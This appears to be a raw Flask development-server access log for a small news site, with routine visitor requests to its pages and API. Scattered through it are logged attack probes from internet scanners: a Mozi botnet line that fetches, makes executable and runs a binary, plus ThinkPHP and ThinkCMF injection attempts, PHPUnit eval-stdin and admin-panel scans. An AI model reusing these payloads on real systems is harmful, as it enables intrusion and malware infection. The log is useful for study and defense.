 * Serving Flask app "app" (lazy loading)
 * Environment: production
   WARNING: This is a development server. Do not use it in a production deployment.
   Use a production WSGI server instead.
 * Debug mode: on
 * Running on http://0.0.0.0:5000/ (Press CTRL+C to quit)
121.160.199.24 - - [18/Jan/2021 14:01:16] "[37mGET /static/newsclip.png HTTP/1.1[0m" 200 -
121.160.199.24 - - [18/Jan/2021 14:01:17] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
121.160.199.24 - - [18/Jan/2021 14:01:26] "[37mGET / HTTP/1.1[0m" 200 -
121.160.199.24 - - [18/Jan/2021 14:01:26] "[37mGET /static/newsclip.png HTTP/1.1[0m" 200 -
121.160.199.24 - - [18/Jan/2021 14:01:26] "[37mGET /static/css/main.css HTTP/1.1[0m" 200 -
121.160.199.24 - - [18/Jan/2021 14:01:26] "[37mGET /static/img_home.jpg HTTP/1.1[0m" 200 -
121.160.199.24 - - [18/Jan/2021 14:01:27] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
121.160.199.24 - - [18/Jan/2021 14:02:29] "[37mGET / HTTP/1.1[0m" 200 -
121.160.199.24 - - [18/Jan/2021 14:02:29] "[37mGET /static/css/main.css HTTP/1.1[0m" 200 -
121.160.199.24 - - [18/Jan/2021 14:02:30] "[37mGET /hottest HTTP/1.1[0m" 200 -
121.160.199.24 - - [18/Jan/2021 14:02:31] "[37mGET /api/hottest?date=2021-1-18 HTTP/1.1[0m" 200 -
121.160.199.24 - - [18/Jan/2021 14:02:31] "[37mGET /static/south-korea.png HTTP/1.1[0m" 200 -
121.160.199.24 - - [18/Jan/2021 14:02:32] "[37mGET /api/hottest?date=2021-1-17 HTTP/1.1[0m" 200 -
121.160.199.24 - - [18/Jan/2021 14:02:34] "[37mGET /api/hottest?date=2021-1-16 HTTP/1.1[0m" 200 -
121.160.199.24 - - [18/Jan/2021 14:02:34] "[37mGET /api/hottest?date=2021-1-17 HTTP/1.1[0m" 200 -
121.160.199.24 - - [18/Jan/2021 14:02:40] "[37mGET /api/hottest?date=2021-1-18 HTTP/1.1[0m" 200 -
121.160.199.24 - - [18/Jan/2021 14:02:41] "[37mGET /api/hottest?date=2021-1-18 HTTP/1.1[0m" 200 -
121.160.199.24 - - [18/Jan/2021 14:03:14] "[37mGET /api/hottest?date=2021-1-18 HTTP/1.1[0m" 200 -
185.140.102.164 - - [18/Jan/2021 14:05:22] "[37mGET / HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 14:07:44] "[37mGET / HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 14:07:46] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
175.124.132.140 - - [18/Jan/2021 14:08:25] "[37mGET / HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 14:08:27] "[37mGET / HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 14:08:30] "[37mGET /latest HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 14:08:31] "[37mGET /api/latest HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 14:08:36] "[37mGET /latest HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 14:08:36] "[37mGET /api/latest HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 14:08:37] "[37mGET /latest HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 14:08:38] "[37mGET /api/latest HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 14:09:09] "[37mGET /hottest HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 14:09:10] "[37mGET /api/hottest?date=2021-1-18 HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 14:09:13] "[37mGET /api/hottest?date=2021-1-17 HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 14:09:15] "[37mGET /api/hottest?date=2021-1-18 HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 14:09:16] "[37mGET /api/hottest?date=2021-1-17 HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 14:09:17] "[37mGET /api/hottest?date=2021-1-16 HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 14:09:18] "[37mGET /api/hottest?date=2021-1-15 HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 14:09:19] "[37mGET /api/hottest?date=2021-1-17 HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 14:09:19] "[37mGET /api/hottest?date=2021-1-18 HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 14:09:25] "[37mGET /api/hottest?date=2021-1-17 HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 14:09:26] "[37mGET /latest HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 14:09:27] "[37mGET /api/latest HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 14:09:37] "[37mGET /latest HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 14:09:38] "[37mGET /api/latest HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 14:09:39] "[37mGET / HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 14:24:58] "[37mGET / HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 14:25:06] "[37mGET /latest HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 14:25:07] "[37mGET /api/latest HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 14:25:10] "[37mGET /hottest HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 14:25:10] "[37mGET /api/hottest?date=2021-1-18 HTTP/1.1[0m" 200 -
162.142.125.55 - - [18/Jan/2021 14:25:14] "[37mGET / HTTP/1.1[0m" 200 -
162.142.125.55 - - [18/Jan/2021 14:25:14] "[37mGET / HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 14:25:20] "[37mGET /api/hottest?date=2021-1-17 HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 14:25:21] "[37mGET /api/hottest?date=2021-1-16 HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 14:25:21] "[37mGET /api/hottest?date=2021-1-15 HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 14:25:22] "[37mGET /api/hottest?date=2021-1-18 HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 14:25:38] "[37mGET /latest HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 14:25:38] "[37mGET /api/latest HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 14:25:47] "[37mGET /hottest HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 14:25:47] "[37mGET /api/hottest?date=2021-1-18 HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 14:25:47] "[37mGET /latest HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 14:25:47] "[37mGET /api/latest HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 14:25:48] "[37mGET /latest HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 14:25:48] "[37mGET /api/latest HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 14:25:51] "[37mGET /latest HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 14:25:51] "[37mGET /api/latest HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 14:25:52] "[37mGET /latest HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 14:25:53] "[37mGET /api/latest HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 14:26:07] "[37mGET /hottest HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 14:26:07] "[37mGET /api/hottest?date=2021-1-18 HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 14:26:10] "[37mGET /api/hottest?date=2021-1-17 HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 14:26:11] "[37mGET /api/hottest?date=2021-1-16 HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 14:32:40] "[37mGET / HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 14:45:04] "[37mGET /latest HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 14:45:05] "[37mGET /api/latest HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 14:45:10] "[37mGET /hottest HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 14:45:11] "[37mGET /api/hottest?date=2021-1-18 HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 14:45:18] "[37mGET /latest HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 14:45:18] "[37mGET /api/latest HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 14:45:20] "[37mGET /hottest HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 14:45:20] "[37mGET /api/hottest?date=2021-1-18 HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 14:45:32] "[37mGET /latest HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 14:45:33] "[37mGET /api/latest HTTP/1.1[0m" 200 -
45.248.192.48 - - [18/Jan/2021 15:09:59] "[33mPOST /HNAP1/ HTTP/1.0[0m" 404 -
40.121.196.61 - - [18/Jan/2021 15:16:15] "[33mGET /login HTTP/1.0[0m" 404 -
40.121.196.61 - - [18/Jan/2021 15:16:15] "[33mGET /jenkins/login HTTP/1.0[0m" 404 -
40.121.196.61 - - [18/Jan/2021 15:16:16] "[33mGET /manager/html HTTP/1.0[0m" 404 -
198.20.124.218 - - [18/Jan/2021 15:33:21] "[37mGET / HTTP/1.1[0m" 200 -
209.141.60.195 - - [18/Jan/2021 16:13:52] "[33mGET /config/getuser?index=0 HTTP/1.1[0m" 404 -
211.176.125.70 - - [18/Jan/2021 16:41:53] "[37mGET / HTTP/1.0[0m" 200 -
211.176.125.70 - - [18/Jan/2021 16:41:53] "[37mGET /api/hottest?date=2021-1-12 HTTP/1.0[0m" 200 -
177.75.220.105 - - [18/Jan/2021 16:47:19] "[37mGET / HTTP/1.1[0m" 200 -
83.97.20.31 - - [18/Jan/2021 16:48:43] code 400, message Bad request version ('0.12\x00')
83.97.20.31 - - [18/Jan/2021 16:48:43] "[35m[1m   ¤ÿSMBr    @              @     PC NETWORK PROGRAM 1.0 MICROSOFT NETWORKS 1.03 MICROSOFT NETWORKS 3.0 LANMAN1.0 LM1.2X002 Samba NT LANMAN 1.0 NT LM 0.12 [0m" HTTPStatus.BAD_REQUEST -
83.97.20.31 - - [18/Jan/2021 16:48:43] "[37mGET / HTTP/1.1[0m" 200 -
211.176.125.70 - - [18/Jan/2021 17:18:43] "[37mGET /api/hottest?date=2021-1-18 HTTP/1.0[0m" 200 -
211.176.125.70 - - [18/Jan/2021 17:34:32] "[37mGET /api/latest HTTP/1.0[0m" 200 -
89.248.168.108 - - [18/Jan/2021 17:35:31] "[37mHEAD / HTTP/1.0[0m" 200 -
211.176.125.70 - - [18/Jan/2021 17:52:28] "[37mGET /api/hottest?date=2021-1-17 HTTP/1.0[0m" 200 -
211.176.125.70 - - [18/Jan/2021 18:09:15] "[37mGET /api/hottest?date=2021-1-16 HTTP/1.0[0m" 200 -
192.241.221.149 - - [18/Jan/2021 19:55:37] "[37mGET / HTTP/1.1[0m" 200 -
167.172.168.195 - - [18/Jan/2021 20:03:17] "[33mPOST /boaform/admin/formLogin HTTP/1.1[0m" 404 -
209.17.96.242 - - [18/Jan/2021 21:15:47] "[37mGET / HTTP/1.1[0m" 200 -
111.229.66.150 - - [18/Jan/2021 22:07:02] "[33mGET /login HTTP/1.0[0m" 404 -
111.229.66.150 - - [18/Jan/2021 22:07:03] "[33mGET /jenkins/login HTTP/1.0[0m" 404 -
111.229.66.150 - - [18/Jan/2021 22:07:03] "[33mGET /manager/html HTTP/1.0[0m" 404 -
45.155.205.108 - - [18/Jan/2021 22:10:39] "[33mPOST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
45.155.205.108 - - [18/Jan/2021 22:10:39] "[33mPOST /api/jsonws/invoke HTTP/1.1[0m" 404 -
45.155.205.108 - - [18/Jan/2021 22:10:40] "[33mGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
45.155.205.108 - - [18/Jan/2021 22:10:40] "[33mGET /solr/admin/info/system?wt=json HTTP/1.1[0m" 404 -
45.155.205.108 - - [18/Jan/2021 22:10:41] "[33mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1[0m" 404 -
45.155.205.108 - - [18/Jan/2021 22:10:41] "[37mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1[0m" 200 -
45.155.205.108 - - [18/Jan/2021 22:10:41] "[37mGET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1[0m" 200 -
45.155.205.108 - - [18/Jan/2021 22:10:41] "[33mGET /console/ HTTP/1.1[0m" 404 -
45.155.205.108 - - [18/Jan/2021 22:10:43] "[33mGET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1[0m" 404 -
45.155.205.108 - - [18/Jan/2021 22:10:43] "[33mPOST /Autodiscover/Autodiscover.xml HTTP/1.1[0m" 404 -
168.232.14.6 - - [18/Jan/2021 22:30:33] "[37mGET / HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 22:55:13] "[37mGET /api/latest HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 22:55:14] "[37mGET / HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 22:55:15] "[37mGET /latest HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 22:55:16] "[37mGET /api/latest HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 22:55:27] "[37mGET / HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 22:55:28] "[37mGET /hottest HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 22:55:28] "[37mGET /api/hottest?date=2021-1-19 HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 22:55:31] "[37mGET /api/hottest?date=2021-1-18 HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 22:55:33] "[37mGET /api/hottest?date=2021-1-19 HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 22:55:34] "[37mGET /api/hottest?date=2021-1-19 HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 22:55:34] "[37mGET /api/hottest?date=2021-1-18 HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 22:55:36] "[37mGET /api/hottest?date=2021-1-19 HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 22:55:39] "[37mGET /api/hottest?date=2021-1-18 HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 22:55:40] "[37mGET /api/hottest?date=2021-1-19 HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 22:55:41] "[37mGET / HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 22:55:42] "[37mGET /latest HTTP/1.1[0m" 200 -
175.124.132.140 - - [18/Jan/2021 22:55:43] "[37mGET /api/latest HTTP/1.1[0m" 200 -
223.62.162.107 - - [18/Jan/2021 23:14:10] "[37mGET / HTTP/1.1[0m" 200 -
223.62.162.107 - - [18/Jan/2021 23:14:12] "[37mGET /latest HTTP/1.1[0m" 200 -
223.62.162.107 - - [18/Jan/2021 23:14:12] "[37mGET /api/latest HTTP/1.1[0m" 200 -
223.62.162.107 - - [18/Jan/2021 23:14:31] "[37mGET / HTTP/1.1[0m" 200 -
223.62.162.107 - - [18/Jan/2021 23:14:32] "[37mGET /hottest HTTP/1.1[0m" 200 -
223.62.162.107 - - [18/Jan/2021 23:14:33] "[37mGET /api/hottest?date=2021-1-19 HTTP/1.1[0m" 200 -
223.62.162.107 - - [18/Jan/2021 23:14:36] "[37mGET /api/hottest?date=2021-1-18 HTTP/1.1[0m" 200 -
223.62.162.107 - - [18/Jan/2021 23:14:56] "[37mGET /api/hottest?date=2021-1-19 HTTP/1.1[0m" 200 -
223.62.162.107 - - [18/Jan/2021 23:14:57] "[37mGET /api/hottest?date=2021-1-18 HTTP/1.1[0m" 200 -
52.250.3.61 - - [18/Jan/2021 23:20:22] "[37mGET / HTTP/1.1[0m" 200 -
138.185.36.181 - - [18/Jan/2021 23:50:58] "[37mGET / HTTP/1.1[0m" 200 -
172.93.102.236 - - [18/Jan/2021 23:51:07] "[33mHEAD /robots.txt HTTP/1.0[0m" 404 -
80.82.77.227 - - [18/Jan/2021 23:51:47] "[37mGET / HTTP/1.1[0m" 200 -
121.4.96.162 - - [18/Jan/2021 23:58:05] "[33mGET /login HTTP/1.0[0m" 404 -
121.4.96.162 - - [18/Jan/2021 23:58:05] "[33mGET /jenkins/login HTTP/1.0[0m" 404 -
121.4.96.162 - - [18/Jan/2021 23:58:05] "[33mGET /manager/html HTTP/1.0[0m" 404 -
223.62.162.107 - - [19/Jan/2021 00:27:06] "[37mGET /hottest HTTP/1.1[0m" 200 -
223.62.162.107 - - [19/Jan/2021 00:27:06] "[37mGET /api/hottest?date=2021-1-19 HTTP/1.1[0m" 200 -
223.62.162.107 - - [19/Jan/2021 00:27:07] "[37mGET / HTTP/1.1[0m" 200 -
223.62.162.107 - - [19/Jan/2021 00:27:08] "[37mGET /hottest HTTP/1.1[0m" 200 -
223.62.162.107 - - [19/Jan/2021 00:27:08] "[37mGET /api/hottest?date=2021-1-19 HTTP/1.1[0m" 200 -
223.62.162.107 - - [19/Jan/2021 00:27:11] "[37mGET /api/hottest?date=2021-1-18 HTTP/1.1[0m" 200 -
223.62.162.107 - - [19/Jan/2021 00:27:12] "[37mGET /api/hottest?date=2021-1-19 HTTP/1.1[0m" 200 -
223.62.162.107 - - [19/Jan/2021 00:27:14] "[37mGET / HTTP/1.1[0m" 200 -
223.62.162.107 - - [19/Jan/2021 00:27:15] "[37mGET /latest HTTP/1.1[0m" 200 -
223.62.162.107 - - [19/Jan/2021 00:27:15] "[37mGET /api/latest HTTP/1.1[0m" 200 -
83.97.20.31 - - [19/Jan/2021 00:36:51] "[37mGET / HTTP/1.0[0m" 200 -
209.17.97.26 - - [19/Jan/2021 00:45:19] "[37mGET / HTTP/1.0[0m" 200 -
209.141.60.195 - - [19/Jan/2021 01:40:00] "[33mGET /config/getuser?index=0 HTTP/1.1[0m" 404 -
113.88.119.140 - - [19/Jan/2021 01:40:41] code 400, message Bad HTTP/0.9 request type ('27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$')
113.88.119.140 - - [19/Jan/2021 01:40:41] "[35m[1m27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0[0m" HTTPStatus.BAD_REQUEST -
89.248.168.108 - - [19/Jan/2021 01:53:29] "[37mHEAD / HTTP/1.0[0m" 200 -
209.141.58.184 - - [19/Jan/2021 01:57:44] "[33mGET /w00tw00t.at.blackhats.romanian.anti-sec:) HTTP/1.1[0m" 404 -
209.141.58.184 - - [19/Jan/2021 01:57:45] "[33mGET /phpMyAdmin/scripts/setup.php HTTP/1.1[0m" 404 -
223.62.162.107 - - [19/Jan/2021 02:08:25] "[37mGET / HTTP/1.1[0m" 200 -
223.62.162.107 - - [19/Jan/2021 02:08:25] "[33mGET /apple-touch-icon-120x120-precomposed.png HTTP/1.1[0m" 404 -
223.62.162.107 - - [19/Jan/2021 02:08:25] "[33mGET /apple-touch-icon-120x120.png HTTP/1.1[0m" 404 -
223.62.162.107 - - [19/Jan/2021 02:08:25] "[33mGET /apple-touch-icon-precomposed.png HTTP/1.1[0m" 404 -
223.62.162.107 - - [19/Jan/2021 02:08:25] "[33mGET /apple-touch-icon.png HTTP/1.1[0m" 404 -
223.62.162.107 - - [19/Jan/2021 02:08:25] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
223.62.162.107 - - [19/Jan/2021 02:08:26] "[33mGET /apple-touch-icon-120x120-precomposed.png HTTP/1.1[0m" 404 -
223.62.162.107 - - [19/Jan/2021 02:08:26] "[33mGET /apple-touch-icon-120x120.png HTTP/1.1[0m" 404 -
223.62.162.107 - - [19/Jan/2021 02:08:26] "[33mGET /apple-touch-icon-precomposed.png HTTP/1.1[0m" 404 -
223.62.162.107 - - [19/Jan/2021 02:08:26] "[33mGET /apple-touch-icon.png HTTP/1.1[0m" 404 -
223.62.162.107 - - [19/Jan/2021 02:08:27] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
89.248.170.31 - - [19/Jan/2021 02:11:21] "[37mGET / HTTP/1.1[0m" 200 -
209.17.97.2 - - [19/Jan/2021 02:17:25] "[37mGET / HTTP/1.1[0m" 200 -
54.250.4.94 - - [19/Jan/2021 02:58:38] "[37mGET /static/newsclip.png HTTP/1.1[0m" 200 -
211.176.125.70 - - [19/Jan/2021 03:16:40] "[37mGET /api/hottest?date=2021-1-19 HTTP/1.0[0m" 200 -
223.38.17.162 - - [19/Jan/2021 03:46:04] "[37mGET / HTTP/1.1[0m" 200 -
223.38.17.162 - - [19/Jan/2021 03:46:04] "[37mGET /static/img_home.jpg HTTP/1.1[0m" 200 -
223.38.17.162 - - [19/Jan/2021 03:46:04] "[37mGET /static/css/main.css HTTP/1.1[0m" 200 -
223.38.17.162 - - [19/Jan/2021 03:46:05] "[36mGET /static/newsclip.png HTTP/1.1[0m" 304 -
223.38.17.162 - - [19/Jan/2021 03:46:06] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
223.38.17.162 - - [19/Jan/2021 03:46:07] "[37mGET /hottest HTTP/1.1[0m" 200 -
223.38.17.162 - - [19/Jan/2021 03:46:08] "[37mGET /api/hottest?date=2021-1-19 HTTP/1.1[0m" 200 -
223.38.17.162 - - [19/Jan/2021 03:46:12] "[37mGET /api/hottest?date=2021-1-18 HTTP/1.1[0m" 200 -
223.38.17.162 - - [19/Jan/2021 03:46:13] "[37mGET /static/south-korea.png HTTP/1.1[0m" 200 -
223.38.17.162 - - [19/Jan/2021 03:46:14] "[37mGET /api/hottest?date=2021-1-19 HTTP/1.1[0m" 200 -
223.38.17.162 - - [19/Jan/2021 03:46:16] "[37mGET /api/hottest?date=2021-1-18 HTTP/1.1[0m" 200 -
223.38.17.162 - - [19/Jan/2021 03:46:19] "[37mGET / HTTP/1.1[0m" 200 -
223.38.17.162 - - [19/Jan/2021 03:46:19] "[37mGET /static/img_home.jpg HTTP/1.1[0m" 200 -
223.62.162.107 - - [19/Jan/2021 04:02:04] "[37mGET / HTTP/1.1[0m" 200 -
223.62.162.107 - - [19/Jan/2021 04:02:04] "[36mGET /static/newsclip.png HTTP/1.1[0m" 304 -
223.62.162.107 - - [19/Jan/2021 04:02:04] "[36mGET /static/css/main.css HTTP/1.1[0m" 304 -
223.62.162.107 - - [19/Jan/2021 04:02:04] "[36mGET /static/img_home.jpg HTTP/1.1[0m" 304 -
223.62.162.107 - - [19/Jan/2021 04:02:05] "[37mGET /latest HTTP/1.1[0m" 200 -
223.62.162.107 - - [19/Jan/2021 04:02:05] "[37mGET /api/latest HTTP/1.1[0m" 200 -
223.62.162.107 - - [19/Jan/2021 04:02:06] "[36mGET /static/south-korea.png HTTP/1.1[0m" 304 -
223.62.162.107 - - [19/Jan/2021 04:02:14] "[37mGET / HTTP/1.1[0m" 200 -
223.62.162.107 - - [19/Jan/2021 04:02:15] "[37mGET /hottest HTTP/1.1[0m" 200 -
223.62.162.107 - - [19/Jan/2021 04:02:15] "[37mGET /api/hottest?date=2021-1-19 HTTP/1.1[0m" 200 -
223.62.162.107 - - [19/Jan/2021 04:02:16] "[37mGET /api/hottest?date=2021-1-18 HTTP/1.1[0m" 200 -
223.62.162.107 - - [19/Jan/2021 04:02:17] "[37mGET /api/hottest?date=2021-1-17 HTTP/1.1[0m" 200 -
223.62.162.107 - - [19/Jan/2021 04:02:18] "[37mGET /api/hottest?date=2021-1-16 HTTP/1.1[0m" 200 -
223.62.162.107 - - [19/Jan/2021 04:08:12] "[37mGET / HTTP/1.1[0m" 200 -
223.62.162.107 - - [19/Jan/2021 04:08:14] "[37mGET /hottest HTTP/1.1[0m" 200 -
